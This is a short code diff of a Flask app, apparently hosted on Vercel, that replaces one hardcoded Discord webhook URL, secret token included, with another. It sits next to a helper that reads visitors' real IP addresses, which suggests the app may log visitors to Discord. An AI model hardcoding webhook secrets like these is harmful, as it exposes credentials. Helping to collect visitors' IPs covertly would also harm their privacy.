@@ -6,7 +6,7 @@ import os
 app = Flask(__name__)
 
 # Hardcoded Discord Webhook (as you wanted)
-WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1489458192877617183/O4zvTeV3pxjfNsPQQcmi3twgcMOGDkXjxbUNyfH5MZxFZhGhFf2GjK9BHW-Jd_8Y47Li"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1495301719465136149/UMlPr_NU7wCSPGX0T4DpprAgbzd6LCzF-tks_lUbaAUs38uXvT0JIN1TWvWVPo4MAcID"
 
 def get_client_ip():
     """Get real visitor IP on Vercel"""
